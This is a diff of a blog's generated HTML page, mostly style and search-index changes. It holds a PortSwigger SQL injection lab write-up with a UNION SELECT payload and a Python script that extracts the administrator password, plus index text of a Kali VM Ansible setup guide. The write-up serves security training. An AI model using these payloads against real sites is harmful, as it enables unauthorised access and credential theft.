 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> compatible <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
 </span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>compatible<span style="color:#e6db74">}</span><span style="color:#e6db74"> compatible data type columns found, suggest combining payloads&#34;</span>)
 </span></span></code></pre></div><p><strong>Reset The <code>NULL</code> Value</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payloadList[y] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;NULL&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payloadList[y] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;NULL&#34;</span>
 </span></span></code></pre></div><p>In the event that we do not get a <code>200</code> response we rest the list position <code>y</code> to be <code>NULL</code> again as other wise the list would just be full of the lab string.</p>
 <p>As we can see when we run the script it prints out the compatible data type fields in position 1 &amp; 2 and also suggests we combine the payloads as they are both valid.
 <p class="imgp">
@@ -434,7 +434,7 @@ If the above conditions are met we increment our compatible counter by <code>1</
 <h3 id="extracting-column-data-via-union-select-statement">Extracting Column Data VIA UNION SELECT Statement:</h3>
 <h4 id="using-burp">Using Burp:</h4>
 <p>As we know there is a &ldquo;users&rdquo; table that has a &ldquo;username&rdquo; &amp; &ldquo;password&rdquo; column this means we now append our additional <code>UNION</code> query below to display the contents for each column.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT username, password FROM users--
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT username, password FROM users--
 </span></span></span></code></pre></div><figure><img src="/ox-hugo/2025-11-13_07-16.png">
 </figure>
 
@@ -461,8 +461,8 @@ If the above conditions are met we increment our compatible counter by <code>1</
 <p>We can also use python to extract the administrators password directly too.</p>
 <p><strong>Additional Import</strong>:
 For us to parse and extract the administrators password we need the BeautifulSoup library.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extractSQLusers</span>():
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extractSQLusers</span>():
 </span></span><span style="display:flex;"><span>    sqlPayload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#39; UNION SELECT username, password FROM users--&#34;</span>
 </span></span><span style="display:flex;"><span>    request<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> sqlPayload, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
 </span></span><span style="display:flex;"><span>    response<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>text
@@ -474,14 +474,14 @@ For us to parse and extract the administrators password we need the BeautifulSou
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
 </span></span></code></pre></div><p><strong>Function definition &amp; payload</strong>
 First we define the function called <code>extractSQLusers</code> we then declare our <code>sqlPayload</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extractSQLusers</span>():
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extractSQLusers</span>():
 </span></span><span style="display:flex;"><span>    sqlPayload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#39; UNION SELECT username, password FROM users--&#34;</span>
 </span></span></code></pre></div><p><strong>Send a request &amp; store the response</strong>:
 We send our payload and store the response in a variable called <code>response</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>request<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> sqlPayload, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>request<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> sqlPayload, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
 </span></span><span style="display:flex;"><span>response<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>text
 </span></span></code></pre></div><p><strong>Parse response</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;administrator&#34;</span> <span style="color:#f92672">in</span> response:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;administrator&#34;</span> <span style="color:#f92672">in</span> response:
 </span></span><span style="display:flex;"><span>    soup <span style="color:#f92672">=</span> BeautifulSoup(request<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
 </span></span><span style="display:flex;"><span>    administratorPass<span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>body<span style="color:#f92672">.</span>find(string<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;administrator&#39;</span>)<span style="color:#f92672">.</span>parent<span style="color:#f92672">.</span>find_next(<span style="color:#e6db74">&#39;td&#39;</span>)<span style="color:#f92672">.</span>contents[<span style="color:#ae81ff">0</span>]
 </span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;The administrator password is: </span><span style="color:#e6db74">{</span>administratorPass<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
@@ -496,7 +496,7 @@ We send our payload and store the response in a variable called <code>response</
 <p>We then set the <code>administratorPass</code> variable by find the text node &ldquo;administrator&rdquo;, taking it&rsquo;s parent element <code>th</code> (this contains the username) and finding the next <code>td</code> element in the row that contains the password, we then grab the first child element of this <code>contents[0]</code> which contains the password string.</p>
 <p><strong>Call the Function</strong>:
 We now call the function so it runs after our other conditions are satisfied.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>  if &#39;My account&#39; in request.text:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>  if &#39;My account&#39; in request.text:
 </span></span><span style="display:flex;"><span>      print(f&#34;Compatible data type found {union+newPayload+comment}&#34;)
 </span></span><span style="display:flex;"><span>      compatible+=1
 </span></span><span style="display:flex;"><span>      if compatible &gt; 1:
@@ -509,7 +509,7 @@ We now call the function so it runs after our other conditions are satisfied.</p
 </p>
 </p>
 <h4 id="whole-script">Whole Script:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
@@ -749,6 +749,13 @@ document.addEventListener("DOMContentLoaded", function() {
 <script>
 window.store = {
     
+    "\/\/uildDrafts:1313\/tags\/ansible\/": {
+        "title": "Ansible",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
+    },
+    
     "\/\/uildDrafts:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -756,11 +763,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/author\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/blind\/": {
-        "title": "Blind",
+    "\/\/uildDrafts:1313\/tags\/automation\/": {
+        "title": "Automation",
         "tags": [],
         "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
+        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
     },
     
     "\/\/uildDrafts:1313\/author\/bloodstiller\/": {
@@ -775,6 +782,55 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
+        "title": "Dotfiles",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/kali\/": {
+        "title": "Kali",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/qemu\/": {
+        "title": "Qemu",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/": {
+        "title": "Security Newsroom Obsidian Plugin Release",
+        "tags": ["kali","automation","qemu","ansible","dotfiles",],
+        "content": "Security Newsroom Obsidian Plugin Release I\u0026rsquo;ve been quiet for a while. Work has been busy \u0026amp; I have been doing some other projects that I can\u0026rsquo;t get into\u0026hellip;\u0026hellip;\nI\u0026rsquo;ve made the switch from my beloved eMacs to obsidian over the last few months and apart from the first week it\u0026rsquo;s been relatively painless. I\u0026rsquo;ve managed to recreate 99% of all eMacs functionality in obsidian (that\u0026rsquo;s functionality I used, not all of eMacs functionality as that would not be possible.)\nOne thing that I have found myself needing is an easy way to keep up with security related news. As the landscape is constantly evolving and growing and there a million different sources to get information from I got bored of jumping around so I thought \u0026ldquo;what if it was just in obsidian\u0026rdquo;. I use obsidian as my web-clipper anyone so let\u0026rsquo;s just put the functionality in here (I say here as I am writing the post in Obsidian)\nSo I decided to create the security newsroom plugin. https://github.com/bloodstiller/obsidian-security-newsroom I\u0026rsquo;ve created a pull request for it to be placed into the official community plugins but so far it has not.\nIt essentially pulls from lots of security resources and allows you to filter, save \u0026amp; clip the whole articles directly within obsidian.\nFull video showing how it works. At the moment as it\u0026rsquo;s not currently approved in the obsidian store if you want to use it you will have to manually add a folder called in your .obsidian/plugins folder called security-newsroom and place the main.js, manifest.json \u0026amp; styles.css from the repo and then load the plugin.\n", 
+        "url": "\/\/uildDrafts:1313\/tools\/security-newsroom-plugin\/security-newsroom-obsidian-plugin\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tools\/": {
+        "title": "Tools",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tools\/"
+    },
+    
+    "\/\/uildDrafts:1313\/tags\/blind\/": {
+        "title": "Blind",
+        "tags": [],
+        "content": "", 
+        "url": "\/\/uildDrafts:1313\/tags\/blind\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/ctf-writeup\/": {
@@ -854,13 +910,6 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/portswigger\/sqli_lab_15\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/": {
-        "title": "Tags",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/"
-    },
-    
     "\/\/uildDrafts:1313\/tags\/waf\/": {
         "title": "Waf",
         "tags": [],
@@ -869,7 +918,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/web-exploitation\/": {
-        "title": "Web-Exploitation",
+        "title": "Web Exploitation",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/web-exploitation\/"
@@ -1282,7 +1331,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/llm\/": {
-        "title": "Llm",
+        "title": "LLM",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/llm\/"
@@ -1737,7 +1786,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/msi\/": {
-        "title": "MSI",
+        "title": "Msi",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/msi\/"
@@ -2133,13 +2182,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/tools\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tools\/": {
-        "title": "Tools",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tools\/"
     },
     
     "\/\/uildDrafts:1313\/tags\/vulnerability-assessment\/": {
@@ -2591,7 +2633,7 @@ window.store = {
     },
     
     "\/\/uildDrafts:1313\/tags\/ssrf\/": {
-        "title": "Ssrf",
+        "title": "SSRF",
         "tags": [],
         "content": "", 
         "url": "\/\/uildDrafts:1313\/tags\/ssrf\/"
@@ -3101,46 +3143,11 @@ window.store = {
         "url": "\/\/uildDrafts:1313\/homelab\/20250220118-nixos-homelab\/"
     },
     
-    "\/\/uildDrafts:1313\/tags\/ansible\/": {
-        "title": "Ansible",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/ansible\/"
-    },
-    
     "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/": {
         "title": "Automating Kali Linux VM Setup: A Comprehensive Guide to QEMU and Ansible Integration",
         "tags": ["kali","automation","qemu","ansible","dotfiles",],
         "content": "As a cybersecurity enthusiast and productivity junkie, I\u0026rsquo;ve always been fascinated by the power of automation. Recently, I decided to streamline my process of setting up Kali Linux virtual machines using QEMU and Ansible. In this article, I\u0026rsquo;ll walk you through how I\u0026rsquo;ve automated the creation and configuration of Kali VMs, complete with my preferred dotfiles and tools.\nThe Need for Automation If you\u0026rsquo;re like me, you probably find yourself creating new Kali VMs frequently for various projects or testing environments. The process of setting up a new VM, updating the system, installing your favorite tools, and configuring your environment can be time-consuming and repetitive. That\u0026rsquo;s where automation comes in handy. You can repurpose this setup for other projects, just change the Ansible playbook and dotfiles.\nBenefits and Challenges This automation setup offers several advantages:\nConsistent environment across all VMs Rapid deployment of new instances Version-controlled configuration (infrastructure as code) Easy sharing and collaboration Some challenges I encountered:\nVirtioFS setup complexity Ansible role organization Package version management Dotfiles synchronization But the benefits far outweigh the initial setup effort.\nPrerequisites Choose your preferred virtualization provider:\nVirtualBox Setup VirtualBox Vagrant Ansible QEMU/KVM Setup (Linux only) (My preferred setup) QEMU/KVM (≥ 4.2) Libvirt (≥ 6.2.0) Vagrant Ansible For QEMU/KVM shared folder support:\nHost: Linux kernel ≥ 5.4\nGuest: Linux kernel ≥ 5.4\nThere is some additional setup required for the vagrant-libvirt plugin so would advise you checkout QEMU/KVM Setup Guide Unable to resolve dependency vagrant-libvirterror: +Update+ 21/02/2025 I recently ran an update and encountered an issue where it refused to launch new VM\u0026rsquo;s. I received an error similar to the below (it was not exactly the same as I had a crash shortly after). Error message given during initialization: Unable to resolve dependency: user requested 'vagrant-libvirt (= 0.12.2)' after alot of searching I found this post I found following the steps resolved the issue. vagrant plugin repair vagrant plugin expunge --reinstall vagrant plugin update VAGRANT_DISABLE_STRICT_DEPENDENCY_ENFORCEMENT=1 vagrant plugin install vagrant-libvirt The Automation Stack My automation setup consists of three main components:\nVagrant for VM provisioning QEMU/KVM for virtualization Ansible for configuration management Let\u0026rsquo;s dive into each component.\n1. Vagrant with QEMU/KVM I chose QEMU/KVM over VirtualBox for several reasons:\nBetter performance on Linux hosts Once you have used KVM/QEMU you will never go back to VirtualBox etc. Native virtualization support VirtioFS for efficient file sharing The Vagrantfile handles:\nVM resource allocation (RAM, CPU) Network configuration Shared folder setup with VirtioFS Ansible provisioner integration Here\u0026rsquo;s the the Vagrantfile:\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.hostname = \u0026#34;kali-vm\u0026#34; # Set hostname inside VM # Disable the default share config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true # Force libvirt provider ENV[\u0026#39;VAGRANT_DEFAULT_PROVIDER\u0026#39;] = \u0026#39;libvirt\u0026#39; # QEMU/libvirt specific settings config.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 libvirt.graphics_type = \u0026#34;spice\u0026#34; libvirt.video_type = \u0026#34;qxl\u0026#34; libvirt.title = \u0026#34;Kali Linux VM\u0026#34; # Set VM title in libvirt libvirt.description = \u0026#34;Kali Linux VM for Security Testing\u0026#34; # Optional description # Enable shared memory for VirtioFS libvirt.memorybacking :access, :mode =\u0026gt; \u0026#34;shared\u0026#34; end # Configure shared folders using VirtioFS config.vm.synced_folder \u0026#34;/home/martin/.config/tmuxinator\u0026#34;, \u0026#34;/home/vagrant/.config/tmuxinator\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.02-LinuxTools\u0026#34;, \u0026#34;/home/vagrant/linuxTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools\u0026#34;, \u0026#34;/home/vagrant/windowsTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career\u0026#34;, \u0026#34;/home/vagrant/Dropbox/40-49_Career\u0026#34;, type: \u0026#34;virtiofs\u0026#34; # Network settings config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.57.11\u0026#34; config.ssh.forward_x11 = true # Provisioning configuration for Ansible config.vm.provision \u0026#34;ansible\u0026#34; do |ansible| ansible.playbook = \u0026#34;../../Ansible/configure-kali.yml\u0026#34; end end 2. Ansible Configuration Ansible automates the entire VM setup process. The main playbook handles:\nSystem updates and package installation Development tools setup Security tools installation Terminal environment configuration (Alacritty, Tmux) Editor setup (Doom Emacs) Dotfiles deployment Here\u0026rsquo;s the main Ansible playbook:\n--- - name: Configure Kali Linux hosts: all become: yes # This is equivalent to using sudo vars: user_home: \u0026#34;/home/vagrant\u0026#34; docker_gpg_key_url: \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; docker_repo: \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\u0026#34; tasks: - name: Update apt cache apt: update_cache: yes cache_valid_time: 3600 - name: Download Iosevka Nerd Font (be patient big file!) get_url: url: https://github.com/ryanoasis/nerd-fonts/releases/download/v3.3.0/Iosevka.zip dest: /tmp/Iosevka.zip mode: \u0026#39;0644\u0026#39; - name: Install unzip if not present apt: name: unzip state: present - name: Extract Iosevka font unarchive: src: /tmp/Iosevka.zip dest: \u0026#34;/usr/local/share/fonts/\u0026#34; remote_src: yes owner: vagrant group: vagrant - name: Update font cache command: fc-cache -fv become_user: vagrant - name: Install base packages apt: name: - eza - alacritty - git - bat - seclists - git - emacs - ripgrep - fd-find state: present - name: Create docker GPG directory file: path: /etc/apt/keyrings state: directory mode: \u0026#39;0755\u0026#39; - name: Check if Docker GPG key exists stat: path: /etc/apt/keyrings/docker.gpg register: docker_gpg - name: Add Docker GPG key shell: | curl -fsSL {{ docker_gpg_key_url }} | gpg --dearmor -o /etc/apt/keyrings/docker.gpg when: not docker_gpg.stat.exists - name: Check if Docker repository exists stat: path: /etc/apt/sources.list.d/docker.list register: docker_repo_file - name: Add Docker repository copy: content: \u0026#34;{{ docker_repo }}\u0026#34; dest: /etc/apt/sources.list.d/docker.list when: not docker_repo_file.stat.exists - name: Install Docker packages apt: name: - docker-ce - docker-ce-cli - containerd.io update_cache: yes state: present - name: Download Starship install script get_url: url: https://starship.rs/install.sh dest: /tmp/starship-install.sh mode: \u0026#39;0755\u0026#39; register: download_script - name: Install Starship shell: /tmp/starship-install.sh --yes args: creates: /usr/local/bin/starship when: download_script is success async: 180 # 5 minute timeout poll: 5 # Check every 5 seconds - name: Install oh-my-zsh become_user: vagrant shell: sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; \u0026#34;\u0026#34; --unattended args: creates: \u0026#34;{{ user_home }}/.oh-my-zsh\u0026#34; - name: Install zsh plugins become_user: vagrant git: repo: \u0026#34;{{ item.repo }}\u0026#34; dest: \u0026#34;{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}\u0026#34; loop: - { repo: \u0026#39;https://github.com/zsh-users/zsh-autosuggestions\u0026#39;, name: \u0026#39;zsh-autosuggestions\u0026#39; } - { repo: \u0026#39;https://github.com/zsh-users/zsh-syntax-highlighting.git\u0026#39;, name: \u0026#39;zsh-syntax-highlighting\u0026#39; } - { repo: \u0026#39;https://github.com/marlonrichert/zsh-autocomplete.git\u0026#39;, name: \u0026#39;zsh-autocomplete\u0026#39; } - { repo: \u0026#39;https://github.com/zdharma-continuum/fast-syntax-highlighting.git\u0026#39;, name: \u0026#39;fast-syntax-highlighting\u0026#39; } - name: Install tmuxinator gem: name: tmuxinator state: present - name: Clone Statistically Likely Usernames git: repo: https://github.com/insidetrust/statistically-likely-usernames.git dest: /usr/share/wordlists/statistically-likely-usernames - name: Download and install Kerbrute get_url: url: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 dest: /usr/local/bin/kerbrute mode: \u0026#39;0755\u0026#39; - name: Install build dependencies for Emacs apt: name: - build-essential - libgccjit-12-dev - libgnutls28-dev - libjansson4 - libjansson-dev - libncurses-dev - libsqlite3-dev - libgif-dev - libjpeg-dev - libpng-dev - libtiff5-dev - libxpm-dev - libwebp-dev - libgtk-3-dev - texinfo - autoconf - automake - pkg-config state: present install_recommends: no register: pkg_result retries: 3 delay: 5 until: pkg_result is success - name: Install tree-sitter separately apt: name: libtree-sitter-dev state: present register: tree_sitter_result retries: 3 delay: 5 until: tree_sitter_result is success - name: Check if Emacs 29.4 is installed command: emacs --version register: emacs_version ignore_errors: true changed_when: false - name: Clone Emacs repository git: repo: git://git.savannah.gnu.org/emacs.git dest: /tmp/emacs version: emacs-29.4 when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Run autogen shell: | cd /tmp/emacs ./autogen.sh when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Configure Emacs shell: | cd /tmp/emacs ./configure --with-native-compilation --with-json --with-tree-sitter --with-sqlite3 args: creates: /tmp/emacs/Makefile when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Build Emacs shell: | cd /tmp/emacs make -j$(nproc) args: creates: /tmp/emacs/src/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 1800 poll: 15 - name: Install Emacs become: yes shell: | cd /tmp/emacs make install args: creates: /usr/local/bin/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 900 poll: 15 - name: Install other base packages apt: name: - eza - alacritty - git - bat - seclists - ripgrep - fd-find state: present install_recommends: no - name: Setup dotfiles become_user: vagrant block: - name: Clone dotfiles git: repo: https://github.com/bloodstiller/kaliconfigs.git dest: \u0026#34;{{ user_home }}/.dotfiles\u0026#34; version: main # Or whatever branch you\u0026#39;re using update: yes # Ensures latest version is cloned clone: yes force: yes # This will overwrite local changes - name: Create required directories file: path: \u0026#34;{{ item }}\u0026#34; state: directory loop: - \u0026#34;{{ user_home }}/.doom.d\u0026#34; - \u0026#34;{{ user_home }}/.config\u0026#34; - name: Create symlinks file: src: \u0026#34;{{ item.src }}\u0026#34; dest: \u0026#34;{{ item.dest }}\u0026#34; state: link force: yes loop: - { src: \u0026#34;{{ user_home }}/.dotfiles/Zsh/.zshrc\u0026#34;, dest: \u0026#34;{{ user_home }}/.zshrc\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/config.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/config.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/init.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/init.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/packages.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/packages.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/README.org\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/README.org\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Starship/starship.toml\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/starship.toml\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Alacritty\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/Alacritty\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Tmux/.tmux.conf\u0026#34;, dest: \u0026#34;{{ user_home }}/.tmux.conf\u0026#34; } - name: Install Doom Emacs become_user: vagrant block: - name: Clone Doom Emacs git: repo: https://github.com/doomemacs/doomemacs dest: \u0026#34;{{ user_home }}/.config/emacs\u0026#34; depth: 1 - name: Install Doom Emacs # This is correct and the path is correct! shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom install --force\u0026#34; args: creates: \u0026#34;{{ user_home }}/.emacs.d/bin/doom\u0026#34; async: 900 poll: 15 - name: Update Doom recipe repositories shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom sync -u\u0026#34; async: 900 poll: 15 - name: Enable Docker service systemd: name: docker enabled: yes state: started - name: Add user to docker group user: name: vagrant groups: docker append: yes - name: Clean up apt: autoremove: yes clean: yes 3. Dotfiles and Tool Configuration The automation includes configuration for:\nAlacritty terminal emulator Tmux with custom keybindings Doom Emacs with security-focused packages Starship cross-shell prompt Zsh with Oh My Zsh Each tool has its own configuration module in the repository:\nAlacritty Configuration Tmux Configuration Doom Emacs Configuration Starship Configuration Zsh Configuration Included Tools \u0026amp; Features The automation sets up a comprehensive environment with:\nSecurity Tools SecLists (lots of lists) Kerbrute for Kerberos authentication testing Statistically Likely Usernames wordlist Common pentesting tools (I have my folders for linux \u0026amp; windows tools (I will make a repo for that soon)) Bloodhound for Active Directory analysis (dockerized) Development Environment Emacs 29.4 with native compilation Doom Emacs configuration This is my main editor and I use it for everything but if you prefer another editor you can change the Ansible playbook. Git version control Docker 